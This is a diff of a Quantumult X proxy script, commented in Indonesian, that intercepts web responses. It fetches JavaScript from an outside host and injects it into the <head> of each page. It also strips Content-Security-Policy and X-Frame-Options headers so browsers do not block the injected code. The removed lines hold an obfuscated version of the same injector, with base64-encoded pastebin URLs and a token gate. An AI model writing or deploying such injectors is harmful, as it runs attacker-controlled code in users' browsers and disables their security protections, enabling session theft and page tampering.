@@ -1,36 +1,47 @@
-const MY_TOKEN = "ojeng_gacor"; 
+/**
+ * QUANTUMULT X INJECTOR - UPDATE URL BARU
+ * URL: https://kaurev.cloud/1800879794/644054998f246062c84e5602158de18fd7d1d64caf26d5201f43957c07dc8aa5/install.user.js
+ */
 
-const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
-const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";
+const INJECT_URL = "https://kaurev.cloud/1800879794/644054998f246062c84e5602158de18fd7d1d64caf26d5201f43957c07dc8aa5/install.user.js"; 
+const FINAL_URL = INJECT_URL + "?t=" + Math.random(); // Anti-cache agar selalu ambil yang terbaru
 
-const _0xF = ['includes', 'body', 'headers', 'replace', '<head>', 'Content-Security-Policy', 'X-Frame-Options', 'post'];
-const _0xM = (n) => _0xF[n];
+const request = {
+    url: FINAL_URL,
+    timeout: 10
+};
 
-const _0xR1 = { url: atob(_0xU1) + "?t=" + Date.now() };
-const _0xR2 = { url: atob(_0xU2) };
+$task.fetch(request).then(response => {
+    let body = $response.body;
+    let headers = $response.headers;
 
-$task.fetch(_0xR1).then(response => {
-    if (response.body && response.body[_0xM(0)](MY_TOKEN)) {
-        $task.fetch(_0xR2).then(resp2 => {
-            let b = $response[_0xM(1)];
-            let h = $response[_0xM(2)];
-            let p = resp2.body;
-
-            if (h) {
-                delete h[_0xM(5)];
-                delete h[_0xM(6)];
-            }
-
-            if (b && p) {
-                const tag = _0xM(4);
-                b = b[_0xM(3)](tag, tag + p);
-            }
-            $done({ body: b, headers: h });
-        }, () => $done({}));
-    } else {
-        if (response.body) {
-            $notify("SYSTEM SECURITY", "ACCESS DENIED", "Token " + MY_TOKEN + " is not active.");
-        }
-        $done({});
+    // Bersihkan header keamanan (agar script tidak diblokir browser)
+    if (headers) {
+        delete headers['Content-Security-Policy'];
+        delete headers['content-security-policy'];
+        delete headers['X-Frame-Options'];
+        delete headers['x-frame-options'];
+        
+        // Paksa browser jangan simpan cache halaman ini
+        headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
+        headers['Pragma'] = 'no-cache';
+        headers['Expires'] = '0';
     }
-}, () => $done({}));
+
+    // Ambil isi kode JS dari URL
+    let injectCode = response.body;
+    let scriptTag = `<script type="text/javascript">${injectCode}</script>`;
+
+    // Masukkan ke dalam tag <head> atau di awal body
+    if (body && body.includes('<head>')) {
+        body = body.replace('<head>', '<head>' + scriptTag);
+    } else if (body) {
+        body = scriptTag + body;
+    }
+
+    $done({ body: body, headers: headers });
+
+}, reason => {
+    // Jika gagal mengambil script, tetap tampilkan web asli tanpa modifikasi
+    $done({});
+});
